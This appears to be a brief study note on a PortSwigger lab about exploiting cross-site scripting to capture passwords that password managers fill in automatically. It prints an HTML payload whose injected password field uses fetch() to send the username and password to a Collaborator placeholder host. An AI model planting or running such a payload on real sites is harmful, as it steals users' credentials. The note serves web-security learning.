# PortSwigger: [Exploiting XSS+CSRF to Capture Passwords](https://portswigger.net/web-security/cross-site-scripting/exploiting#exploiting-cross-site-scripting-to-capture-passwords)

Password managers that automatically submit a username and password using forms allow bypassing common XSS data-exfiltration protections.

Example payload:

```html
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://COLLAB_SUB.oastify.com',{
    method:'POST',
    mode: 'no-cors',
    body:username.value+':'+this.value
});">
```

Callback:

![](_/attacking-pw-managers-20250603-1.png)